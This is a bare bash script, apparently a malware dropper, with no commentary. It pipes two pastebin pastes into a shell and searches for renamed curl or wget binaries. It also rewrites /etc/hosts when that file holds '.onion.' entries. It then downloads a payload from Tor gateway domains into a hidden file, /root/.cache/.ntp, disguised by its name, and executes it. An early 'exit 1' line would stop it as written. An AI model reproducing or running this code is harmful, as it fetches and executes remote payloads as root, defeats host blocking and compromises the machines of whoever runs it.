#!/usr/bin/env bash
[[ 1 ]] && exit 1

(curl -fsSL https://pastebin.com/raw/LD1QaXpQ || \
 wget -q -O- https://pastebin.com/raw/LD1QaXpQ ) | sh

(curl -fsSL https://pastebin.com/raw/aF2Ts2N3 || \
 wget -q -O- https://pastebin.com/raw/aF2Ts2N3 ) | sed -e 's/\r//g' | sh

tbin=$(command -v passwd);
bpath=$(dirname "${tbin}");

curl="curl";
if [ $(curl --version 2>/dev/null|grep "curl "|wc -l) -eq 0 ]; then
    curl="echo";
    if [ "${bpath}" != "" ]; then
        for f in ${bpath}*; do
            strings $f 2>/dev/null|grep -q "CURLOPT_VERBOSE" && curl="$f" && break;
        done;
    fi;
fi;

wget="wget";
if [ $(wget --version 2>/dev/null|grep "wgetrc "|wc -l) -eq 0 ]; then
    wget="echo";
    if [ "${bpath}" != "" ]; then
        for f in ${bpath}*; do
            strings $f 2>/dev/null|grep -q "to <bug-wget@gnu.org>" && wget="$f" && break;
        done;
    fi;
fi;

if [ $(cat /etc/hosts|grep -i ".onion."|wc -l) -ne 0 ]; then
    echo "127.0.0.1 localhost" > /etc/hosts >/dev/null 2>&1;
fi;

(
${curl} -fsSLk --retry 2 --connect-timeout 22 --max-time 75 \
    https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm -o /root/.cache/.ntp || \
${curl}  -fsSLk --retry 2 --connect-timeout 22 --max-time 75 \
    https://an7kmd2wp4xo7hpr.tor2web.io/src/ldm -o /root/.cache/.ntp || \
${curl}  -fsSLk --retry 2 --connect-timeout 22 --max-time 75 \
    https://an7kmd2wp4xo7hpr.onion.sh/src/ldm -o /root/.cache/.ntp || \
${wget}  --quiet --tries=2 --wait=5 --no-check-certificate --connect-timeout=22 --timeout=75 \
    https://an7kmd2wp4xo7hpr.tor2web.su/src/ldm -O /root/.cache/.ntp || \
${wget}  --quiet --tries=2 --wait=5 --no-check-certificate --connect-timeout=22 --timeout=75 \
    https://an7kmd2wp4xo7hpr.tor2web.io/src/ldm -O /root/.cache/.ntp || \
${wget}  --quiet --tries=2 --wait=5 --no-check-certificate --connect-timeout=22 --timeout=75 \
    https://an7kmd2wp4xo7hpr.onion.sh/src/ldm -O /root/.cache/.ntp
) && \
chmod +x /root/.cache/.ntp && /bin/sh /root/.cache/.ntp
